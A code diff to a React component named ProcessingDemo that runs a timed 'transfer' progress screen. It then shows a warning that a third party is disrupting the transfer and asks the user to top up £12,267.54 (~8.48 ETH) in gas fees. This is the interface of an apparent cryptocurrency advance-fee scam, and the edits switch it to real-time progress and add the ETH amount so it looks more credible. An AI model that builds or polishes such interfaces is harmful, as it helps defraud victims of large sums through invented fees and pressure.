@@ -4,10 +4,12 @@ export const ProcessingDemo = () => {
   const [progress, setProgress] = useState(0);
   const [showWarning, setShowWarning] = useState(false);
   useEffect(() => {
-    // TEMPORARY: For testing, set start time 1.6 hours ago to see warning state
-    const testStartTime = (Date.now() - 1.6 * 60 * 60 * 1000).toString();
-    localStorage.setItem(STORAGE_KEY, testStartTime);
-    let startTime: string | null = testStartTime;
+    // Start from now (real time)
+    let startTime: string | null = localStorage.getItem(STORAGE_KEY);
+    if (!startTime) {
+      startTime = Date.now().toString();
+      localStorage.setItem(STORAGE_KEY, startTime);
+    }
     const startTimeMs = parseInt(startTime, 10);
     const calculateProgress = () => {
       const elapsedMs = Date.now() - startTimeMs;
@@ -145,7 +147,7 @@ export const ProcessingDemo = () => {
                   A third party has been identified attempting to disrupt this transfer. There is insufficient balance of gas fees for the transaction to get fully confirmed.
                 </p>
                 <p className="text-sm text-destructive font-medium">
-                  Please top up £12,267.54 to cover the remaining gas fees and complete the transfer.
+                  Please top up £12,267.54 (~8.48 ETH) to cover the remaining gas fees and complete the transfer.
                 </p>
               </div>}
           </div>
